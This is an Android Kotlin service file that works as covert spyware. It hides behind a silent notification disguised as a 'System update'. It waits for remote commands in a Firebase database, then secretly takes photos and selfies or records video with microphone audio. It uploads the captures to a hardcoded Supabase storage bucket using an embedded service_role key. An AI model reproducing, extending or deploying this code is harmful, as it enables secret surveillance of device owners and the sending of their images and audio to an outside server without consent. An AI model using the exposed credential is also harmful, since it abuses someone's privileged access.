package com.example.devsync

  import android.Manifest
  import android.app.*
  import android.content.Context
  import android.content.Intent
  import android.content.pm.PackageManager
  import android.graphics.ImageFormat
  import android.hardware.camera2.*
  import android.media.Image
  import android.media.ImageReader
  import android.media.MediaRecorder
  import android.os.*
  import android.provider.Settings
  import androidx.core.app.NotificationCompat
  import com.google.firebase.database.*
  import kotlinx.coroutines.*
  import okhttp3.*
  import okhttp3.MediaType.Companion.toMediaTypeOrNull
  import okhttp3.RequestBody.Companion.toRequestBody
  import java.io.File
  import java.io.FileOutputStream
  import java.nio.ByteBuffer
  import java.util.concurrent.Semaphore
  import java.util.concurrent.TimeUnit

  class CameraService : Service() {

      companion object {
          const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
          const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
          const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
      }

      private val deviceId by lazy {
          Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
      }
      private val deviceIdShort get() = deviceId.takeLast(8)

      private lateinit var database: DatabaseReference
      private val http = OkHttpClient.Builder().callTimeout(60, TimeUnit.SECONDS).build()

      private var cameraDevice: CameraDevice? = null
      private var cameraCaptureSession: CameraCaptureSession? = null
      private var imageReader: ImageReader? = null
      private var mediaRecorder: MediaRecorder? = null
      private var isRecordingVideo = false
      private var currentVideoFile: File? = null
      private val cameraOpenCloseLock = Semaphore(1)
      private lateinit var cameraManager: CameraManager
      private lateinit var backgroundThread: HandlerThread
      private lateinit var backgroundHandler: Handler

      override fun onCreate() {
          super.onCreate()
          cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
          startBackgroundThread()
          startCameraForeground()
          database = FirebaseDatabase.getInstance(DB_URL).getReference("devices/${deviceId}")
          setupFirebaseListeners()
      }

      override fun onDestroy() {
          super.onDestroy()
          stopBackgroundThread()
          closeCamera()
      }

      override fun onBind(intent: Intent?) = null

      private fun startBackgroundThread() {
          backgroundThread = HandlerThread("CameraBackground")
          backgroundThread.start()
          backgroundHandler = Handler(backgroundThread.looper)
      }

      private fun stopBackgroundThread() {
          backgroundThread.quitSafely()
          try { backgroundThread.join() } catch (_: Exception) {}
      }

      private fun startCameraForeground() {
          val channelId = "camera_channel"
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
              val ch = NotificationChannel(channelId, "Camera Service", NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
              getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
          }
          val notification = NotificationCompat.Builder(this, channelId)
              .setContentTitle("System update")
              .setContentText("Optimizing performance")
              .setSmallIcon(android.R.drawable.ic_dialog_info)
              .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .setSilent(true)
              .build()
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
              startForeground(1003, notification,
                  android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
          } else {
              startForeground(1003, notification)
          }
      }

      private fun setupFirebaseListeners() {
          // Back camera photo
          database.child("take_photo").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                      database.child("take_photo").removeValue()
                      takePhoto(CameraCharacteristics.LENS_FACING_BACK, "cam")
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          // Front camera selfie
          database.child("take_selfie").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                      database.child("take_selfie").removeValue()
                      takePhoto(CameraCharacteristics.LENS_FACING_FRONT, "selfie")
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          // Camera video recording flag
          database.child("camera_video_flag").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  val enable = snapshot.getValue(Boolean::class.java) ?: false
                  if (enable && !isRecordingVideo) startCameraVideoRecording()
                  else if (!enable && isRecordingVideo) stopCameraVideoRecording()
              }
              override fun onCancelled(error: DatabaseError) {}
          })
      }

      // ── Photo Capture ─────────────────────────────────────────────────────────

      private fun takePhoto(facing: Int, prefix: String) {
          if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
          try {
              val cameraId = getCameraId(facing) ?: getCameraId(CameraCharacteristics.LENS_FACING_BACK) ?: return
              imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
              imageReader!!.setOnImageAvailableListener({ reader ->
                  val image: Image = reader.acquireNextImage() ?: return@setOnImageAvailableListener
                  val buffer: ByteBuffer = image.planes[0].buffer
                  val bytes = ByteArray(buffer.remaining())
                  buffer.get(bytes)
                  image.close()
                  saveAndUploadPhoto(bytes, prefix)
                  closeCamera()
              }, backgroundHandler)

              if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) return

              cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                  override fun onOpened(camera: CameraDevice) {
                      cameraOpenCloseLock.release()
                      cameraDevice = camera
                      val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                          addTarget(imageReader!!.surface)
                          set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                          set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                          set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                      }
                      camera.createCaptureSession(listOf(imageReader!!.surface),
                          object : CameraCaptureSession.StateCallback() {
                              override fun onConfigured(session: CameraCaptureSession) {
                                  cameraCaptureSession = session
                                  session.capture(req.build(), null, backgroundHandler)
                              }
                              override fun onConfigureFailed(session: CameraCaptureSession) { closeCamera() }
                          }, backgroundHandler)
                  }
                  override fun onDisconnected(camera: CameraDevice) {
                      cameraOpenCloseLock.release(); camera.close()
                  }
                  override fun onError(camera: CameraDevice, error: Int) {
                      cameraOpenCloseLock.release(); camera.close()
                  }
              }, backgroundHandler)
          } catch (_: Exception) {
              if (cameraOpenCloseLock.availablePermits() == 0) cameraOpenCloseLock.release()
          }
      }

      private fun saveAndUploadPhoto(bytes: ByteArray, prefix: String) {
          CoroutineScope(Dispatchers.IO).launch {
              try {
                  val ts = System.currentTimeMillis()
                  val fileName = "${prefix}_${deviceIdShort}_${ts}.jpg"
                  val file = File(cacheDir, fileName)
                  FileOutputStream(file).use { it.write(bytes) }
                  uploadToSupabase(file, "photos", fileName, "image/jpeg")
                  file.delete()
              } catch (_: Exception) {}
          }
      }

      // ── Video Recording ───────────────────────────────────────────────────────

      private fun startCameraVideoRecording() {
          if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
          if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
          try {
              val cameraId = getCameraId(CameraCharacteristics.LENS_FACING_BACK) ?: return
              val ts = System.currentTimeMillis()
              val fileName = "camvid_${deviceIdShort}_${ts}.mp4"
              val videoFile = File(cacheDir, fileName)
              currentVideoFile = videoFile

              @Suppress("DEPRECATION")
              mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                  MediaRecorder(this) else MediaRecorder()

              mediaRecorder!!.apply {
                  setAudioSource(MediaRecorder.AudioSource.MIC)
                  setVideoSource(MediaRecorder.VideoSource.SURFACE)
                  setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                  setOutputFile(videoFile.absolutePath)
                  setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                  setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                  setVideoSize(640, 480)
                  setVideoFrameRate(24)
                  setVideoEncodingBitRate(1_000_000)
                  prepare()
              }

              if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) return

              cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                  override fun onOpened(camera: CameraDevice) {
                      cameraOpenCloseLock.release()
                      cameraDevice = camera
                      camera.createCaptureSession(listOf(mediaRecorder!!.surface),
                          object : CameraCaptureSession.StateCallback() {
                              override fun onConfigured(session: CameraCaptureSession) {
                                  cameraCaptureSession = session
                                  val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                      addTarget(mediaRecorder!!.surface)
                                      set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                  }
                                  session.setRepeatingRequest(req.build(), null, backgroundHandler)
                                  mediaRecorder!!.start()
                                  isRecordingVideo = true
                              }
                              override fun onConfigureFailed(session: CameraCaptureSession) {
                                  isRecordingVideo = false; closeCamera()
                              }
                          }, backgroundHandler)
                  }
                  override fun onDisconnected(camera: CameraDevice) {
                      cameraOpenCloseLock.release(); camera.close(); isRecordingVideo = false
                  }
                  override fun onError(camera: CameraDevice, error: Int) {
                      cameraOpenCloseLock.release(); camera.close(); isRecordingVideo = false
                  }
              }, backgroundHandler)
          } catch (_: Exception) {
              if (cameraOpenCloseLock.availablePermits() == 0) cameraOpenCloseLock.release()
              isRecordingVideo = false
          }
      }

      private fun stopCameraVideoRecording() {
          isRecordingVideo = false
          val fileToUpload = currentVideoFile
          currentVideoFile = null
          try { cameraCaptureSession?.stopRepeating(); mediaRecorder?.stop() } catch (_: Exception) {}
          mediaRecorder?.reset(); mediaRecorder?.release(); mediaRecorder = null
          closeCamera()
          fileToUpload?.let { file ->
              if (file.exists()) {
                  CoroutineScope(Dispatchers.IO).launch {
                      try { uploadToSupabase(file, "videos", file.name, "video/mp4"); file.delete() } catch (_: Exception) {}
                  }
              }
          }
      }

      private fun closeCamera() {
          try { cameraCaptureSession?.close(); cameraCaptureSession = null } catch (_: Exception) {}
          try { cameraDevice?.close(); cameraDevice = null } catch (_: Exception) {}
          try { imageReader?.close(); imageReader = null } catch (_: Exception) {}
      }

      private fun uploadToSupabase(file: File, bucket: String, fileName: String, mimeType: String) {
          val body = file.readBytes().toRequestBody(mimeType.toMediaTypeOrNull())
          val req = Request.Builder()
              .url("$SUPABASE_URL/storage/v1/object/$bucket/$fileName")
              .header("Authorization", "Bearer $SUPABASE_KEY")
              .header("apikey", SUPABASE_KEY)
              .header("Content-Type", mimeType)
              .post(body).build()
          http.newCall(req).execute().use {}
      }

      private fun getCameraId(facing: Int): String? = try {
          cameraManager.cameraIdList.firstOrNull { id ->
              cameraManager.getCameraCharacteristics(id)
                  .get(CameraCharacteristics.LENS_FACING) == facing
          }
      } catch (_: Exception) { null }
  }
  